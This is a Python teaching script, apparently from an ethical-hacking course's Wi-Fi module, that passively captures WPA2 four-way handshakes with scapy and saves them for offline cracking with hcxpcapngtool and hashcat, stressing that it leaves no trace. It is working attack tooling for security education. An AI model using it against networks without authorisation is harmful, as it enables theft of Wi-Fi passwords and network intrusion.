#!/usr/bin/env python3
"""
03_capture/01_handshake_catcher.py — Passively capture WPA2 4-way handshakes.

The 4-way handshake is the moment a client proves to an AP that it knows
the password — by deriving a key from it and signing a message.
We don't interfere. We just sit here, sipping coffee, watching it happen.

Every time a device reconnects naturally (waking from sleep, re-roaming,
walking back in range), it re-does the handshake. We catch it.
No deauth. No packets sent. No evidence we were ever here.

The resulting .pcap feeds directly into hcxpcapngtool → hashcat in Session 3,
where the offline cracking happens. Today we just collect.

Usage:
    # Target a specific AP, locked to its channel — most reliable
    sudo python3 03_capture/01_handshake_catcher.py \\
        --iface wlan1 --bssid AA:BB:CC:DD:EE:FF --channel 6 --output lab.pcap

    # Catch everything on whatever channel the hopper lands on
    sudo python3 03_capture/01_handshake_catcher.py --iface wlan1 --output lab.pcap

Validate the capture afterwards:
    aircrack-ng -J val lab.pcap
    hcxpcapngtool -o hash.22000 lab.pcap
    hashcat -m 22000 hash.22000 rockyou.txt   ← that's Session 3's problem

Requires: pip install scapy

CYBERS3C — Ethical Hacking Postgrad — Wi-Fi Module — Session 2
"""

import argparse
import signal
import subprocess
import sys
import time
from collections import defaultdict
from datetime import datetime

try:
    from scapy.all import (
        Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeResp,
        EAPOL, RadioTap,
        sniff, wrpcap,
    )
except ImportError:
    print("[!] Scapy not installed. Without it this script is just a very long comment.")
    print("    Fix:  pip install scapy")
    sys.exit(1)

# --- make wifi_utils (repo root) importable from any topic subfolder ---
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from wifi_utils import (
    get_ssid,
    require_root, require_monitor_mode,
    add_iface_arg, add_output_arg, add_duration_arg, add_bssid_arg, parse_bssid_arg,
    safe_write_json,
)


# ──────────────────────────────────────────────
# EAPOL message number detection
#
# The 4-way handshake looks like this:
#
#   AP  ──M1──►  STA    (here's a nonce, prove yourself)
#   AP  ◄──M2──  STA    (here's my nonce + MIC, I know the password)
#   AP  ──M3──►  STA    (great, here's the group key, install it)
#   AP  ◄──M4──  STA    (installed, let's do this)
#
# We can crack the PSK from M1+M2 alone. M2+M3 also works.
# Having all four is ideal but not required.
#
# Key Information field (bytes 5-6 of the raw EAPOL frame):
#   bit 6  (0x0040) = Install
#   bit 7  (0x0080) = Key ACK
#   bit 8  (0x0100) = Key MIC
#   bit 9  (0x0200) = Secure
#
#   M1:  ACK=1  MIC=0  Install=0  Secure=0   (AP sends nonce)
#   M2:  ACK=0  MIC=1  Install=0  Secure=0   (STA proves knowledge)
#   M3:  ACK=1  MIC=1  Install=1  Secure=1   (AP sends GTK)
#   M4:  ACK=0  MIC=1  Install=0  Secure=1   (STA confirms)
# ──────────────────────────────────────────────

def _eapol_msg_num(pkt) -> int | None:
    """
    Identify which message in the 4-way handshake this EAPOL frame is.
    Returns 1-4 on success, None if it's something else entirely
    (e.g. EAPOL-Start, EAPOL-Logoff, or general chaos).
    """
    try:
        raw = bytes(pkt[EAPOL])
        if len(raw) < 7:
            return None  # too short to be a key frame
        key_info = (raw[5] << 8) | raw[6]
        ack     = bool(key_info & 0x0080)
        mic     = bool(key_info & 0x0100)
        install = bool(key_info & 0x0040)
        secure  = bool(key_info & 0x0200)

        if ack and not mic and not install and not secure:
            return 1  # M1: AP says 'hello, prove yourself'
        if not ack and mic and not install and not secure:
            return 2  # M2: STA says 'yes I know the password, watch'
        if ack and mic and install and secure:
            return 3  # M3: AP says 'perfect, here is the group key'
        if not ack and mic and not install and secure:
            return 4  # M4: STA says 'got it, done'
        return None
    except Exception:
        return None  # corrupted frame or a chipset having a bad day


# ──────────────────────────────────────────────
# AP bookkeeping — collect SSIDs from beacons
# so we can display friendly names next to BSSIDs.
# ──────────────────────────────────────────────

_ap_ssids: dict[str, str] = {}  # bssid → ssid


def _record_beacon(pkt):
    """
    Snoop on beacons and probe responses to build a BSSID→SSID map.
    Not strictly necessary for cracking, but makes the output readable
    by humans who haven't memorised every BSSID in the room.
    """
    if not (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)):
        return
    dot11 = pkt[Dot11]
    bssid = dot11.addr3
    if not bssid:
        return
    bssid = bssid.lower()
    if bssid in _ap_ssids:
        return  # already know this one
    ssid = get_ssid(pkt)
    _ap_ssids[bssid] = ssid if ssid else "<hidden>"


# ──────────────────────────────────────────────
# Capture state
# ──────────────────────────────────────────────

# "bssid|sta" → {msg_number: packet}
_handshakes: dict[str, dict[int, object]] = defaultdict(dict)
_complete:   set[str]  = set()   # sessions with a usable handshake pair
_all_pkts:   list      = []      # accumulates everything for the pcap
_start_time = time.time()


# ──────────────────────────────────────────────
# Packet handler
# ──────────────────────────────────────────────

def handle_packet(pkt):
    """
    Main packet handler. Called for every frame that passes lfilter.
    Bookkeeps beacons, accumulates EAPOL frames, detects complete handshakes.
    """
    _record_beacon(pkt)   # always check for SSID intel
    _all_pkts.append(pkt) # save everything — we want a clean pcap

    if not pkt.haslayer(EAPOL) or not pkt.haslayer(Dot11):
        return  # nothing else to do with non-EAPOL frames

    dot11 = pkt[Dot11]

    # Determine who is AP and who is STA from the DS bits.
    # FC flags: bit 0 = ToDS, bit 1 = FromDS
    fc_ds = dot11.FCfield & 0x03

    if fc_ds == 0b10:      # FromDS: frame came FROM the AP
        bssid, sta = dot11.addr2, dot11.addr1
    elif fc_ds == 0b01:    # ToDS: frame going TO the AP
        bssid, sta = dot11.addr1, dot11.addr2
    else:                  # IBSS or WDS — rare, handle gracefully
        bssid, sta = dot11.addr3, dot11.addr2

    if not bssid or not sta:
        return

    bssid = bssid.lower()
    sta   = sta.lower()
    key   = f"{bssid}|{sta}"

    msg_num = _eapol_msg_num(pkt)
    if msg_num is None:
        return  # not a key frame — EAPOL-Start or similar noise

    _handshakes[key][msg_num] = pkt
    msgs    = _handshakes[key]
    seen    = sorted(msgs.keys())
    label   = "M" + "".join(str(m) for m in seen)
    ssid    = _ap_ssids.get(bssid, "?")
    elapsed = int(time.time() - _start_time)

    print(
        f"\r  [EAPOL] {bssid}  STA:{sta}  {label:<6}"
        f"  SSID:{ssid[:20]:<20}  complete:{len(_complete)}  {elapsed:4d}s   ",
        end="",
        flush=True,
    )

    # A session is crackable if we have at least M1+M2 or M2+M3.
    # The PTK can be derived and the MIC verified with just two messages.
    usable = (1 in msgs and 2 in msgs) or (2 in msgs and 3 in msgs)

    if usable and key not in _complete:
        _complete.add(key)
        ts = datetime.now().strftime("%H:%M:%S")
        print(
            f"\n\n  [✓] COMPLETE (crackable) HANDSHAKE — {ts}\n"
            f"      BSSID  : {bssid}\n"
            f"      STA    : {sta}\n"
            f"      SSID   : {ssid}\n"
            f"      Msgs   : {label}\n"
        )


# ──────────────────────────────────────────────
# Summary and output
# ──────────────────────────────────────────────

def print_summary(output_path: str):
    """
    Print a clean summary at the end. If we caught nothing,
    the message is diplomatic but honest.
    """
    elapsed = int(time.time() - _start_time)
    print(f"\n\n{'─' * 58}")
    print(f"  Duration           : {elapsed}s")
    print(f"  Total packets      : {len(_all_pkts)}")
    print(f"  EAPOL sessions     : {len(_handshakes)}")
    print(f"  Crackable HS       : {len(_complete)}")

    if _complete:
        print()
        for key in sorted(_complete):
            bssid, sta = key.split("|")
            ssid = _ap_ssids.get(bssid, "?")
            msgs = sorted(_handshakes[key].keys())
            print(f"    ✓  {bssid}  STA:{sta}  SSID:{ssid}"
                  f"  M{''.join(str(m) for m in msgs)}")

    print(f"{'─' * 58}")

    if _complete:
        print(f"\n[*] Next steps (Session 3):")
        print(f"    hcxpcapngtool -o hash.22000 {output_path}")
        print(f"    hashcat -m 22000 hash.22000 rockyou.txt")
    else:
        print("\n[!] No usable handshake captured.")
        print("    Options:")
        print("    • Wait longer — clients reconnect when they wake up")
        print("    • Make sure you're on the right channel (--channel N)")
        print("    • Session 3 covers active deauth if you're impatient")


def save_pcap(path: str):
    """
    Write everything to disk. Even incomplete handshakes are useful —
    tools like hcxpcapngtool are good at finding value in partial captures.
    """
    if not _all_pkts:
        print("\n[!] Nothing to save. The air was empty today.")
        return
    try:
        wrpcap(path, _all_pkts)
        print(f"[+] pcap saved → {path}  ({len(_all_pkts)} packets)")
    except Exception as e:
        print(f"[!] Could not write pcap to '{path}': {e}")


# ──────────────────────────────────────────────
# Entry point
# ──────────────────────────────────────────────

def main():
    require_root()

    parser = argparse.ArgumentParser(
        description=(
            "Passive WPA2 4-way handshake catcher — "
            "we observe, we record, we leave no trace."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  sudo python3 03_capture/01_handshake_catcher.py \\\n"
            "      --iface wlan1 --bssid AA:BB:CC:DD:EE:FF --channel 6 --output lab.pcap\n"
            "  sudo python3 03_capture/01_handshake_catcher.py --iface wlan1 --output lab.pcap\n\n"
            "Patience is the primary skill required here.\n"
            "Phones reconnect on their own. Just wait."
        ),
    )
    add_iface_arg(parser)
    add_bssid_arg(parser)
    add_output_arg(parser, default="handshake.pcap")
    add_duration_arg(parser)
    parser.add_argument("--channel",  type=int, default=None,
                        help="Lock the interface to this channel (recommended with --bssid)")
    args = parser.parse_args()

    target_bssid = parse_bssid_arg(args.bssid)

    if args.channel is not None:
        r = subprocess.run(
            ["iw", "dev", args.iface, "set", "channel", str(args.channel)],
            capture_output=True,
            text=True,
        )
        if r.returncode == 0:
            print(f"[*] Locked to channel {args.channel}")
        else:
            print(f"[!] Channel lock failed: {r.stderr.strip()}")
            print("    Continuing anyway — channel hopper may be helping.")

    require_monitor_mode(args.iface)

    print(f"\n=== 03_capture/01_handshake_catcher.py ===")
    print(f"    Interface  : {args.iface}")
    print(f"    Target     : {target_bssid or 'any BSSID'}")
    print(f"    Output     : {args.output}")
    print(f"    Duration   : {'infinite (Ctrl-C to stop)' if args.duration == 0 else f'{args.duration}s'}")
    print(f"    Mode       : PASSIVE — we send ZERO frames")
    print()
    print("    Waiting for natural reconnections ...")
    print("    Every time a phone wakes up, it re-runs the handshake.")
    print("    Ctrl-C to stop and save.\n")

    def lfilter(pkt):
        """
        Pre-filter: accept beacons/probe responses (SSID snooping)
        and EAPOL frames. Everything else is irrelevant noise.
        If a target BSSID is set, also filter by address.
        """
        if not pkt.haslayer(Dot11):
            return False
        dot11 = pkt[Dot11]

        is_beacon_or_probe = dot11.type == 0 and dot11.subtype in (8, 5)
        is_eapol           = pkt.haslayer(EAPOL)

        if not (is_beacon_or_probe or is_eapol):
            return False

        if target_bssid:
            addrs = [
                a.lower()
                for a in [dot11.addr1, dot11.addr2, dot11.addr3]
                if a
            ]
            return target_bssid in addrs

        return True

    def on_sigint(sig, frame):
        """Ctrl-C: print summary, save pcap, exit with dignity."""
        print_summary(args.output)
        save_pcap(args.output)
        sys.exit(0)

    signal.signal(signal.SIGINT, on_sigint)

    timeout = args.duration if args.duration > 0 else None
    sniff(
        iface=args.iface,
        prn=handle_packet,
        store=False,
        timeout=timeout,
        lfilter=lfilter,
    )

    # Reached only when --duration expires (not via Ctrl-C)
    print_summary(args.output)
    save_pcap(args.output)


if __name__ == "__main__":
    main()
